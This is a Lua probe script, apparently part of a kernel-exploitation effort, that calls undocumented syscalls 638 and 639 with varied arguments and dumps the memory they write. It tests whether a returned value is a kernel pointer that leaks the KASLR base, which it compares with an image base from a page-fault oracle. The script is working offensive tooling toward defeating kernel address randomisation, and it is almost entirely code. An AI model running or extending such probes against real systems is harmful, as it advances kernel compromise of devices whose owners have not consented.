-- CRASH_CLASS: MODERATE
-- PROBE 1027a: 638 writes a supervisor-shaped qword - is it a kernel pointer?
--
-- 1026a: 638(0,0,buf,0x100) writes {0xFFFFFFFFFDC7BB70, 0xE10} deterministically,
-- 638(0,buf,0x100) writes {0xE10}. 0xE10 = 3600. If the first qword is a kernel
-- pointer, comparing it against the image base found by the #PF oracle answers
-- whether it is derived from the relocatable kernel (a KASLR leak) or something
-- per-thread (a kstack).
print("=== PROBE 1027a: 638 STRUCT ===")
local function to_num(v)
  if type(v) == "table" then
    if v.tonumber then local ok, r = pcall(function() return v:tonumber() end); if ok then return r end end
    if v.h and v.l then return v.h * 2^32 + v.l end
  end
  return tonumber(v) or 0
end
local function make_syscall(num)
  local t = {}
  for k, v in pairs(syscall.pipe) do t[k] = v end
  t.syscall_no = num
  setmetatable(t, getmetatable(syscall.pipe))
  return t
end
local function rq(a) local ok, v = pcall(function() return memory.read_qword(a) end); if ok then return to_num(v) end return nil end
local function wq(a, v) local ok = pcall(function() memory.write_qword(a, v) end); return ok end
local function wd(a, v) local ok = pcall(function() memory.write_dword(a, v) end); return ok end

local SENT = 0xCCCCCCCC
local ba = memory.alloc(0x1000)
local function fill() for o = 0, 0xFF8, 8 do wq(ba + o, SENT) end end
local function count()
  local c = 0
  for o = 0, 0xFF8, 8 do if rq(ba + o) ~= SENT then c = c + 1 end end
  return c
end
local function dump(n)
  local out = {}
  for i = 0, n - 1 do out[#out + 1] = string.format("%X", rq(ba + i * 8) or 0) end
  print("    " .. table.concat(out, " "))
end

local sa = memory.alloc(0x40)
for o = 0, 0x38, 8 do wq(sa + o, 0) end
wd(sa + 0x08, 2); wd(sa, 1)
pcall(function() return make_syscall(416)(12, sa, 0) end)

local c638 = make_syscall(638)
local c639 = make_syscall(639)

-- (a) does arg1 / arg2 select what is returned?
for a1 = 0, 6 do
  for _, a2 in ipairs({0, 1, 2, 0x100}) do
    fill()
    local ok, rv = pcall(function() return c638(uint64(a1), uint64(a2), uint64(ba), uint64(0x100), uint64(0), uint64(0)) end)
    local n = count()
    print(string.format("  [a] 638(%d,%d) rv=%s written=%d", a1, a2, tostring(ok and to_num(rv) or "ERR"), n))
    if n > 0 then dump(8) end
  end
end

-- (b) does arg4 (the length) matter?
for _, len in ipairs({0x10, 0x40, 0x100, 0x1000}) do
  fill()
  local ok, rv = pcall(function() return c638(uint64(0), uint64(0), uint64(ba), uint64(len), uint64(0), uint64(0)) end)
  print(string.format("  [b] 638 len=0x%X rv=%s written=%d", len, tostring(ok and to_num(rv) or "ERR"), count()))
  dump(6)
end

-- (c) 639 with the same shapes (it wrote -0xE10)
for _, a2 in ipairs({0, 1}) do
  fill()
  local ok, rv = pcall(function() return c639(uint64(0), uint64(a2), uint64(ba), uint64(0x100), uint64(0), uint64(0)) end)
  print(string.format("  [c] 639(0,%d) rv=%s written=%d", a2, tostring(ok and to_num(rv) or "ERR"), count()))
  dump(6)
end

-- (d) is the value stable over time (same process)?
for i = 1, 4 do
  fill()
  pcall(function() return c638(uint64(0), uint64(0), uint64(ba), uint64(0x100), uint64(0), uint64(0)) end)
  print(string.format("  [d%d] %X", i, rq(ba) or 0))
end
print(string.format("[Z] alive pid=%d", to_num(make_syscall(20)())))
